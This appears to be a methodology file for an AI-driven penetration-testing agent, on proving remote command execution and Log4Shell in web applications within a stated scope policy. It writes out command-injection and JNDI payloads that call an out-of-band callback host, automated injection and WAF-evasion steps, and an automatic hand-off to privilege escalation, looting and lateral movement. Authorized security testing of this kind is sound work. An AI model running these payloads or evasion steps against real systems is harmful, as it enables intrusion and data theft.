---
name: attack-rce
description: Remote code / OS-command execution — user input reaches a command interpreter, an unsafe exec, or a logged JNDI lookup (Log4Shell), yielding code execution.
category: web-application
tags: [rce, command-injection, os-command, log4shell, jndi, arg-injection]
cwe_ids: [CWE-77, CWE-78, CWE-94, CWE-917]
chains_with: [oob-interactsh, attack-ssti, attack-ognl, attack-deser, poc-standard]
tools: [interactsh-client, commix, wafrift, curl, httpx]
version: "1.1"
---

# Remote code / command execution

## Objective
Prove attacker input reaches code/command execution. Proof is **command output** (`id`/`whoami`/`hostname`
only, per policy) OR an **OOB callback** from the command — never a 500, a timing wobble alone, or a
reflected payload. This is the terminal impact other injection classes (`attack-ssti`/`attack-ognl`/
`attack-deser`) escalate INTO; use the specific class when the sink is a template/EL/deserializer. Target
HTTP via the leash; blind OOB via interactsh direct.

## Fingerprints (requires)
- Shell metachar reaching a command (filename/convert/export/ping/dns/pdf/backup/git params).
- Unsafe exec wrappers: ImageMagick/ffmpeg/LibreOffice/LaTeX/git/tar/`exec`/`system`/`subprocess shell=True`.
- **Log4Shell/JNDI:** any header/field (`User-Agent`, `X-Api-Version`, username) later logged by a vulnerable
  `log4j`/JNDI-resolving stack.
- Argument injection (a value prefixed with `-`/`--` into a CLI).

## Methodology
1. **Map the sink + the OS.** Which param feeds a shell/exec; Linux vs Windows (changes the probe).
2. **Prove BLIND first (safest, strongest oracle).** Inject a command that resolves a UNIQUE interactsh
   host and watch `bin/interactsh-client -json -o raw/rce/oob.jsonl`:
   - command-inj: `;curl http://<token>.oob`, `$(curl …)`, `` `nslookup <token>.oob` ``, `|ping -c1 <token>.oob`
     (try separators/encodings/CRLF; `bin/commix` via `tools/leashed.sh $T bin/commix -u "$U" --technique=... ` can automate).
   - Log4Shell: `${jndi:ldap://<token>.oob/x}` in each logged field; a DNS/LDAP callback = evaluated.
   A callback for YOUR unique token = execution. (Mind `[[env-mihomo-9090-intercept]]`: never OOB on :9090.)
3. **Escalate to command output** within safe-PoC: return/exfil `id`/`whoami`/`hostname`. Stop at proof.
4. **Blind-only sinks:** keep the OOB proof; do NOT force an interactive shell to "confirm". The callback IS
   the oracle.
5. **Mint the foothold + hand off.** Proven command execution MINTS `shell:<host>` + `foothold:<host>`
   automatically (the workflow derives it from a confirmed RCE) — the **post-foothold stage** (internal-recon
   → privesc → loot → bounded in-scope lateral, see `internal-recon`/`privesc`/`loot`/`lateral`) fires in the
   next wave with no extra action from you. Your job ends at the oracle-proven `whoami`; do NOT privesc,
   persist, or pivot from inside THIS mission — that is a separate staged hypothesis.
6. **WAF/filter blocking the payload?** Mutate it through `bin/wafrift` (grammar=cmdi): it ladders
   separators/encodings/CRLF/content-type until one passes, then hand the winning form back to the probe.

## Red line
`id`/`whoami`/`hostname` only — no reading beyond policy, no writes, no persistence/implant, no
box-crashing payload (route a kernel/DoS path to `human_review`). No brute of any credential. If the only
path needs evading a safeguard → `proven_state:"blocked", blocked_reason:"safeguard"` (hand off).

## What counts as a finding
- **Critical:** OOB callback for your unique token, or `id`/`whoami` output returned.
- **Lead only:** 500/timing/length anomaly with no callback and no output — `[UNCONFIRMED CANDIDATE]`.

## Evidence (under `raw/rce/`)
The injecting request, the interactsh callback line (unique token, proto, src-IP≠our egress, ts) or the
command output, commix session log if used, and a runnable PoC. Oracle rows: *RCE (command output)* and
*SSRF / blind RCE (OOB)* in `proof/oracles` — the origin-check veto applies (callback src-IP must be the
target, not 127.0.0.1 or our egress).
